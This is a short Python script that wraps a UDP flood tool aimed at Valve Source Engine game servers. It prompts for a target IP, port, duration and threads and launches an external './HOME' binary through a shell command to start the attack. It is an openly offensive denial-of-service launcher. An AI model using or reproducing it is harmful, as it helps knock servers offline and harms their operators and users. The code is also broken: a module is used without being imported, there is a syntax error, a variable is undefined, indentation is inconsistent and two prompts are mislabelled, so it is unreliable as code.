from subprocess import run
from os import system
import os
import sys
import time

class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET
	
    
def methods():
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HOME: UDP Valve Source Engine specific flood")

def main():
	methods():
	attack = input("command: ")
	if option in ["01", "1"]:
		try:
			ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
		    port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
			thread = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
			floodtime = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
		    subprocess.run([f'screen -dm ./HOME {ip} {port} {thread} -1 {floodtime}'], shell=True)
			print(Color.LG+f"\n [!] Attack sent successfully!\n")

main()